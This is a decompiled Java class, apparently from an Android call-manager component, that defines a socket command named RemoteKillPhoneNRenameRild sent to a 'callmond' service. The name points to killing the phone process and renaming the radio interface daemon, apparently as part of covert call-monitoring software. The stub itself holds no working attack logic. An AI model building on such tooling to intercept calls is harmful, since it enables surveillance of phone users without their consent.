package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;

public class RemoteKillPhoneNRenameRild
  extends SocketCmd
{
  private static final long serialVersionUID = 2598541042117820367L;
  
  public RemoteKillPhoneNRenameRild()
  {
    super(null, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmond";
  }
  
  protected String getTag()
  {
    return "RemoteKillPhoneNRenameRild";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteKillPhoneNRenameRild.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */